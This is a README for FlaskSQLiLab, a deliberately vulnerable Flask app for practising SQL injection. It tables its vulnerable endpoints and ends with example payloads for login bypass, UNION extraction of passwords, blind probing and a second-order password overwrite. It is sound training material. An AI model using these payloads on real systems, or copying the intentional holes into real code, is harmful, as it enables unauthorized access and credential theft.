# FlaskSQLiLab

**Built and created by [Meni](https://x.com/MeniTasa) – Cybersecurity Lead | 🛡️ CISO | ☁️ CloudSec | 🌐 NetSec (CCNP) | 🔍 Web Pentester | ✍️ Writer**

**FlaskSQLiLab** is a deliberately vulnerable Flask web application built specifically for educational purposes. It enables security enthusiasts, penetration testers, and cybersecurity students to practice a variety of SQL injection techniques and understand web security concepts, such as session handling, cookie manipulation, and JSON-based data extraction.

---

## ⚠️ Security Disclaimer

**Important:** FlaskSQLiLab is intentionally vulnerable and designed solely for educational and learning purposes. **Never expose or deploy it publicly or use it in a production environment.**

---

## 📂 Project Structure

```
FlaskSQLiLab/
├── venv/
├── app.py
├── schema.sql
├── users.db
├── requirements.txt
├── static/
│   └── style.css
└── templates/
    ├── login.html
    ├── register.html
    ├── dashboard.html
    ├── search.html
    ├── check_user.html
    └── update_profile.html
```

---

## 🚀 Getting Started

### Step 1: Set Up the Environment

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Step 2: Initialize the Database

```bash
sqlite3 users.db < schema.sql
```

### Step 3: Run the Application

```bash
python app.py
```

Access the application at:

```
http://localhost:5000
```

---

## 📌 Features, Vulnerabilities & JSON Endpoints

The application contains these intentionally vulnerable endpoints for practice:

| Endpoint              | Type of Injection                          | Usage / Response                                  |
| --------------------- | ------------------------------------------ | ------------------------------------------------- |
| `/` (Login)           | Error-based SQL Injection                  | Authentication bypass                             |
| `/register`           | Error-based SQL Injection                  | User registration & injection practice            |
| `/search`             | Error-based SQL Injection                  | JSON Data extraction (`{"users": [...]}`)         |
| `/profile/<username>` | UNION-based SQL Injection                  | JSON-based data extraction of user information    |
| `/check_user`         | Blind SQL Injection (Boolean & Time-based) | User existence check with JSON response           |
| `/update_profile`     | Second-order SQL Injection                 | Update user profile & JSON response               |
| `/session-info`       | Session & Cookie Manipulation              | Inspect and modify sessions/cookies (JSON output) |
| `/dashboard`          | Cookie-based SQL Injection                 | Cookie manipulation and authentication bypass     |

---

## 🎯 Enhanced Security Challenges (JSON-based)

- **Extract Sensitive Data:**  
  Practice injecting malicious payloads (`UNION`, error-based) to extract usernames and passwords in structured JSON format.

- **Cookie Manipulation:**  
  Modify the "remember me" cookie manually to demonstrate cookie vulnerabilities and SQL injection through cookies.

- **Session Handling:**  
  Use JSON responses from `/session-info` to clearly visualize session data and understand interactions with browser cookies.

---

## 🔧 Technologies Used

- Flask (Python)
- SQLite3
- HTML & CSS
- JSON responses for structured data exchange
- Git (version control)

---

## 📖 Educational Usage & Ethical Guidelines

Use **FlaskSQLiLab** exclusively in controlled and isolated environments for cybersecurity training purposes. Always follow ethical guidelines and respect legal boundaries when practicing penetration testing.

---

### 📌 Example SQL Injection Payloads (to practice clearly):

- **Login authentication bypass:**

  ```sql
  admin' OR '1'='1' --
  ```

- **Extract all users via `/search`:**

  ```sql
  %' OR '1'='1' --
  ```

- **UNION-based Injection via `/profile/<username>`:**

  ```
  admin' UNION SELECT id,username,password,remember_token FROM users --
  ```

- **Boolean Blind Injection via `/check_user`:**

  ```sql
  admin' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --
  ```

- **Second-order Injection via `/update_profile`:**
  ```sql
  attacker', password='hacked' WHERE username='admin' --
  ```

---

**Happy Hacking!**
